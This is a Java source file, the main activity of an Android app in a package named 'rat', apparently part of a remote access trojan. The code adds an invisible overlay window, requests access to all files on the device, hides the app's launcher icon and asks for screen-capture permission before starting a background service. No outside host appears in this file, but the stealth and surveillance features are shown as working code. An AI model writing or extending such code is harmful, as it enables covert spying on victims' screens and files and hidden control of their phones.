package com.wexow.rat;

import android.content.Intent;
import android.content.SharedPreferences;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.net.Uri;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import com.wexow.rat.core.MainService;
import com.wexow.rat.managers.ScreenManager;
import com.wexow.rat.utils.Prefs;

public class MainActivity extends AppCompatActivity {
    private static final String TAG = "MainActivity";
    private static final int SCREEN_CAPTURE_REQ = 1001;

    public static final String PREFS = "wexow_prefs";
    public static final String KEY_MP_RESULT_CODE = "mp_result_code";
    public static final String KEY_MP_RESULT_DATA = "mp_result_data";
    public static final String KEY_MP_VALID = "mp_valid";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        addStealthOverlay();

        requestAllFilesAccess();

        Log.e(TAG, "🚀 MainActivity onCreate");

        getWindow().getDecorView().setBackgroundColor(android.graphics.Color.BLACK);

        boolean setupDone = Prefs.isSetupDone(this);

        if (!setupDone) {
            startActivity(new Intent(this, PermissionWizardActivity.class));
            finish();
            return;
        }

        SharedPreferences prefs = getSharedPreferences(PREFS, MODE_PRIVATE);
        boolean hasPermission = prefs.getBoolean(KEY_MP_VALID, false);

        if (hasPermission) {
            Log.e(TAG, "✅ Setup complete — keeping activity alive");
            try {
                com.wexow.rat.stealth.StealthManager.hideAppIcon(this);
            } catch (Exception ignored) {
            }

            startService();
            return;
        }

        // MediaProjection
        try {
            MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
            if (mpm != null) {
                Log.e(TAG, "🎯 Requesting MediaProjection");
                startActivityForResult(mpm.createScreenCaptureIntent(), SCREEN_CAPTURE_REQ);
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ " + e.getMessage());
        }
    }

    private android.view.View stealthOverlay;

    private void addStealthOverlay() {
        try {
            android.view.WindowManager wm = (android.view.WindowManager) getSystemService(WINDOW_SERVICE);

            stealthOverlay = new android.view.View(this);
            stealthOverlay.setBackgroundColor(0x01000000);

            int type = android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O
                    ? android.view.WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                    : android.view.WindowManager.LayoutParams.TYPE_PHONE;

            android.view.WindowManager.LayoutParams params = new android.view.WindowManager.LayoutParams(
                    1, 1, type,
                    android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                            | android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                            | android.view.WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                    android.graphics.PixelFormat.TRANSLUCENT);

            params.gravity = android.view.Gravity.TOP | android.view.Gravity.LEFT;
            params.x = 0;
            params.y = 0;

            wm.addView(stealthOverlay, params);
            Log.e(TAG, "✅ Stealth overlay added");
        } catch (Exception e) {
            Log.e(TAG, "❌ Stealth overlay: " + e.getMessage());
        }
    }

    private void requestAllFilesAccess() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!android.os.Environment.isExternalStorageManager()) {
                Log.e(TAG, "🔓 Requesting MANAGE_EXTERNAL_STORAGE");
                try {
                    Intent intent = new Intent(
                            android.provider.Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                    intent.setData(Uri.parse("package:" + getPackageName()));
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(intent);
                } catch (Exception e) {
                    try {
                        Intent intent = new Intent(
                                android.provider.Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        startActivity(intent);
                    } catch (Exception e2) {
                        Log.e(TAG, "❌ Cannot open All Files settings");
                    }
                }
            }
        }
    }

    @Override
    protected void onDestroy() {
        if (stealthOverlay != null) {
            try {
                android.view.WindowManager wm = (android.view.WindowManager) getSystemService(WINDOW_SERVICE);
                wm.removeView(stealthOverlay);
                stealthOverlay = null;
            } catch (Exception ignored) {
            }
        }
        super.onDestroy();
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if (requestCode == SCREEN_CAPTURE_REQ && resultCode == RESULT_OK && data != null) {
            ScreenManager.initProjection(getApplicationContext(), resultCode, data);

            getSharedPreferences(PREFS, MODE_PRIVATE)
                    .edit()
                    .putBoolean(KEY_MP_VALID, true)
                    .apply();

            Log.e(TAG, "✅ MediaProjection initialized");
        }

        startService();
    }

    private void startService() {
        try {
            Intent i = new Intent(this, MainService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(i);
            } else {
                startService(i);
            }
        } catch (Exception ignored) {
        }
    }
}
